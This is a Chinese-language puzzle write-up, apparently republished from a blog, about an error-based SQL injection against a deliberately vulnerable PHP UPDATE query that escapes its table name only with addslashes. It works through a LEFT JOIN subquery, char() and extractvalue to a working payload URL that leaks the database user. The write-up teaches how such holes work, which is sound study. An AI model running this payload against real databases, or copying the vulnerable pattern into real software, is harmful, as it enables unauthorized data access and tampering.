作者： **[niexinming](http://blog.csdn.net/niexinming)
[@n0tr00t](http://www.n0tr00t.com)**

p牛在群里面出了一个好玩的题目，正好晚上空虚寂寞冷，就做一下暖暖身子，题目是：

    
    
    <?php
    $link = mysqli_connect('localhost', 'root', 'root');
    mysqli_select_db($link, 'code');
    
    $table = addslashes($_GET['table']);
    $sql = "UPDATE `{$table}` 
            SET `username`='admin'
            WHERE id=1";
    if(!mysqli_query($link, $sql)) {
        echo(mysqli_error($link));
    }
    mysqli_close($link);

首先一看，这个题目有几个坑，首先update下的注入不是很常见，第二因为有addslashes的存在，整个注入不能出现单引号，双引号和斜线等，第三就是这个sql语句没有写在一行代码里面，所以不能用单行注释把后面的语句注释掉
这样导致整个注入语句只能在UPDATE `{$table}`发挥了 首先查一下mysql update的用法：
http://www.cnblogs.com/ggjucheng/archive/2012/11/06/2756392.html
这个文章在末尾有个很有用的提示：但是multiple-table UPDATE语句可以使用在SELECT语句中允许的任何类型的联合，比如LEFT JOIN
这个于是我就搜到另一个文章：Mysql跨表更新 多表update
sql语句总结（http://www.jb51.net/article/32648.htm） 里面有几个简单的用到LEFT
JOIN的例子，但是似乎还不够，我希望能引入一个子查询，于是我找到了另一个文章：http://blog.csdn.net/catoop/article/details/46670911
这个文章里面有个例子不错：

    
    
    UPDATE student D
      LEFT JOIN (SELECT 
            B.studentId,
                    SUM(B.score) AS s_sum,
                    ROUND(AVG(B.score),1) AS s_avg
               FROM score B
              WHERE b.examTime >= '2015-03-10'
              GROUP BY B.studentId) C
        ON (C.studentId = D.id)
    
       SET D.score_sum = c.s_sum,
           D.score_avg = c.s_avg
     WHERE D.id = 
           (
             SELECT 
            E.id FROM 
            (
                      SELECT 
                    DISTINCT a.studentId AS id
                        FROM score A
                       WHERE A.examTime >= '2015-03-10'
                    ) E 
              WHERE E.id = D.id
           )
       AND d.age = 1;

可以看到他引入了子查询在update语句里面，而且子查询的位置刚刚好在我想要的地方，于是我构造一个这样的子查询：

    
    
    update `table` t left join (select id from `table`) tt on tt.user=t.username set username ='admin' where id=1;

但是报错：ERROR 1052 (23000): Column 'id' in where clause is ambiguous
原因是：是因为多表查询的时候几个表中同时出现了某个相同的列名，
所以不能出现相同的列名，但是，我除了table表以外不知道数据库的其他表了，或者根本就只有一个表，所以我就要用mysql的虚表dual，

    
    
    update `table` t left join (select ‘1’ as user from dual) tt on tt.user=t.username set username ='admin' where id=1;

我这里用select ‘1’ as user from dual 把’1’这个字段重命名是要满足后面on的条件，及：on
tt.user=t.username 而且这里要用‘1’而不是用数字是因为tale表里面的username类型是varchar类型
执行后面发现可以正常更新，也就是说成功的引入了一个子查询在我想要的地方，那么后面的事情就简单很多了，直接引入一个报错注入的语句在子查询里面就可以了初期的答案是：

    
    
    table` t left join (select '1' as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=t.username

注入后完整sql语句

    
    
    update `table` t left join (select \‘1\’ as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=t.username` 
    set username ='admin' 
    where id=1

我很快的发现两个问题 1.注入后的反引号没有闭合2.就是单引号被转义掉了 解决第一个问题就是在on的最后一个字段上加入一个反引号，让他和后面的的反引号闭合
解决第二个问题就是把出现单引号的位置用char函数代替 于是完美的答案就出现了：

    
    
    http://localhost/code.php?table=table` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username

注入之后的sql语句是是：

    
    
    update `table` t left join (select char(97) as user from dual where (extractvalue(1,concat(0x7e,(select user()),0x7e)))) tt on tt.user=`t.username`
     set username ='admin' 
    where id=1;

![注入后的完美结果](https://images.seebug.org/content/images/2017/02/1-3.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/216/>

